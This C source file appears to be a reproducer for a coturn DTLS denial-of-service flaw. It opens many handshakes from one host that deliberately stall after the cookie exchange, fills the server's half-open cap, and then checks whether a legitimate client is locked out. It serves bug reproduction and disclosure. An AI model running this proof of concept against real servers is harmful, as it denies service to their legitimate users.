/* Minimal OpenSSL DTLS client for the coturn half-open-cap lockout reproducer.
 *
 * A "stalled" handshake sends a ClientHello, answers the server's HelloVerifyRequest with the
 * cookie (so the source is return-routable and passes coturn's DTLSv1_listen() check), receives
 * the server's ServerHello..ServerHelloDone flight, and then never sends its own key-exchange
 * flight. A "complete" handshake runs to the end (SSL_do_handshake() == 1), then closes.
 * All clients use the same host and differ only in their UDP source port.
 */
#include <arpa/inet.h>
#include <openssl/err.h>
#include <openssl/ssl.h>
#include <poll.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

static unsigned char buf[65536];
static unsigned int long_timer(SSL *s, unsigned int us) {
  (void)s;
  (void)us;
  return 60000000u;
}
static int rx(int fd, int ms) {
  struct pollfd p = {fd, POLLIN, 0};
  if (poll(&p, 1, ms) <= 0) {
    return -1;
  }
  return recv(fd, buf, sizeof(buf), 0);
}
static void flush(int fd, BIO *w) {
  char o[65536];
  int n;
  while ((n = BIO_read(w, o, sizeof(o))) > 0) {
    send(fd, o, n, 0);
  }
}

typedef struct {
  int fd;
  SSL *ssl;
  BIO *r, *w;
} cl;

static int open_client(cl *c, const char *ip, int port, int lport, SSL_CTX *ctx) {
  c->fd = socket(AF_INET, SOCK_DGRAM, 0);
  struct sockaddr_in me = {0};
  me.sin_family = AF_INET;
  me.sin_port = htons(lport);
  if (bind(c->fd, (struct sockaddr *)&me, sizeof(me)) < 0) {
    perror("bind");
    return -1;
  }
  struct sockaddr_in srv = {0};
  srv.sin_family = AF_INET;
  srv.sin_port = htons(port);
  inet_pton(AF_INET, ip, &srv.sin_addr);
  if (connect(c->fd, (struct sockaddr *)&srv, sizeof(srv)) < 0) {
    perror("connect");
    return -1;
  }
  c->ssl = SSL_new(ctx);
  c->r = BIO_new(BIO_s_mem());
  c->w = BIO_new(BIO_s_mem());
  BIO_set_mem_eof_return(c->r, -1);
  SSL_set_bio(c->ssl, c->r, c->w);
  SSL_set_mtu(c->ssl, 1200);
  SSL_set_options(c->ssl, SSL_OP_NO_QUERY_MTU);
  SSL_set_connect_state(c->ssl);
  DTLS_set_timer_cb(c->ssl, long_timer);
  return 0;
}

/* returns number of server-flight datagrams received after the cookie ClientHello (0 = dropped) */
static int cookie_exchange(cl *c, int feed) {
  int n, k = 0;
  SSL_do_handshake(c->ssl);
  flush(c->fd, c->w);
  if ((n = rx(c->fd, 2000)) <= 0) {
    return -1; /* no HelloVerifyRequest */
  }
  BIO_write(c->r, buf, n);
  SSL_do_handshake(c->ssl);
  flush(c->fd, c->w);
  while ((n = rx(c->fd, 700)) > 0) {
    k++;
    if (feed) {
      BIO_write(c->r, buf, n);
    }
  }
  return k;
}

static int probe(const char *ip, int port, int lport, SSL_CTX *ctx, const char *label) {
  cl p;
  if (open_client(&p, ip, port, lport, ctx) < 0) {
    return -1;
  }
  int k = cookie_exchange(&p, 1);
  int hs = 0;
  for (int t = 0; t < 8 && hs != 1 && k > 0; t++) {
    hs = SSL_do_handshake(p.ssl);
    flush(p.fd, p.w);
    if (hs == 1) {
      break;
    }
    int n = rx(p.fd, 700);
    if (n > 0) {
      BIO_write(p.r, buf, n);
    }
  }
  printf("%-40s from port %d: server flight datagrams = %d, handshake %s\n", label, lport, k,
         hs == 1 ? "COMPLETED" : "NOT completed");
  fflush(stdout);
  if (hs == 1) {
    SSL_shutdown(p.ssl);
    flush(p.fd, p.w);
  }
  close(p.fd);
  return hs == 1;
}

static int hold(cl *h, const char *ip, int port, int lport, SSL_CTX *ctx) {
  if (open_client(h, ip, port, lport, ctx) < 0) {
    return -1;
  }
  return cookie_exchange(h, 0) > 0;
}

/* usage: holdopen <server-ip> <port> <cap> <base-port>
 * 1. baseline: one complete handshake (must succeed)
 * 2. cap-1 stalled handshakes, then a complete handshake (must still succeed: cap not yet reached)
 * 3. one more stalled handshake (= cap), then a complete handshake from a NEW source port
 * Exit 0 = step 3 locked out while steps 1-2 succeeded (reproduced); 1 = not reproduced; 2 = harness error. */
int main(int argc, char **argv) {
  if (argc < 5) {
    return 2;
  }
  const char *ip = argv[1];
  int port = atoi(argv[2]), C = atoi(argv[3]), base = atoi(argv[4]);
  SSL_CTX *ctx = SSL_CTX_new(DTLS_client_method());
  SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);
  cl *h = calloc(C + 1, sizeof(cl));
  int b = probe(ip, port, base + 1000, ctx, "[1] baseline client");
  if (b < 0) {
    return 2;
  }
  int got = 0;
  for (int i = 0; i < C - 1; i++) {
    int r = hold(&h[i], ip, port, base + i, ctx);
    if (r < 0) {
      return 2;
    }
    got += r;
  }
  printf("[2] %d of %d stalled handshakes received a server flight (holding them)\n", got, C - 1);
  fflush(stdout);
  int a = probe(ip, port, base + 1001, ctx, "[2] client with cap-1 stalled handshakes");
  int r = hold(&h[C - 1], ip, port, base + C - 1, ctx);
  if (r < 0) {
    return 2;
  }
  got += r;
  printf("[3] %d of %d stalled handshakes received a server flight (holding them)\n", got, C);
  fflush(stdout);
  int z = probe(ip, port, base + 1002, ctx, "[3] client with cap stalled handshakes");
  if (b != 1 || a != 1 || got != C) {
    printf("RESULT: harness precondition failed (baseline=%d cap-1=%d held=%d)\n", b, a, got);
    return 2;
  }
  printf("RESULT: %s\n", z == 1 ? "NOT REPRODUCED - the client completed"
                                : "REPRODUCED - a legitimate client is locked out by stalled handshakes from one host");
  return z == 1 ? 1 : 0;
}
